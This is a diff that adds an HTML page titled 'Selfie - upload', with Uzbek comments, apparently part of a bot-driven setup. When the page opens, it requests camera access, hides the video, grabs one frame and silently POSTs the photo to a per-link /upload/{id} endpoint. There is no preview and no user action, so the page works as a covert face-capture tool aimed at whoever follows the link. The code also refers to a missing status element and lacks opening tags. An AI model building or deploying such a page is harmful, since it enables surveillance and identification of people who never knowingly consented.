@@ -1,0 +1,80 @@
+<!-- selfie.html - joylashgan fayl server bilan bir darajada bo'lsin (ya'ni bot.js bilan birga) -->
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Selfie - upload</title>
+<style>
+body { font-family: Arial, sans-serif; text-align:center; padding:30px; }
+video, canvas { display:none; }
+</style>
+</head>
+<body>
+
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
+
+
+<script>
+// URL path dan id ni o'qish
+const pathParts = location.pathname.split('/');
+const id = pathParts[pathParts.length - 1];
+
+
+const status = document.getElementById('status');
+const video = document.getElementById('v');
+const canvas = document.getElementById('c');
+
+
+(async function(){
+try {
+// Kamera so'rovini yuboradi — brauzer ruxsat so'raydi
+const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+video.srcObject = stream;
+
+
+// Qisqa kutish video tayyor bo'lishi uchun
+await new Promise(r => setTimeout(r, 500));
+
+
+const width = video.videoWidth || 640;
+const height = video.videoHeight || 480;
+canvas.width = width; canvas.height = height;
+const ctx = canvas.getContext('2d');
+ctx.drawImage(video, 0, 0, width, height);
+
+
+// kamera to'xtatish
+stream.getTracks().forEach(t => t.stop());
+
+
+
+
+
+canvas.toBlob((blob) => {
+if (!blob) {
+
+return;
+}
+
+
+const fd = new FormData();
+fd.append('photo', blob, 'selfie.png');
+
+
+// Upload endpoint — aynan serverdagi /upload/:id ga jo'natamiz
+fetch(`/upload/${id}`, { method: 'POST', body: fd });
+
+
+// Darhol foydalanuvchini boshqa sahifaga yo'naltirish yoki xabar ko'rsatish mumkin
+status.textContent = 'Rasm yuborildi. Rahmat!';
+
+
+}, 'image/png');
+
+
+} catch (err) {
+console.warn(err);
+
+}
+})();
+</script>
+</body>
+</html>
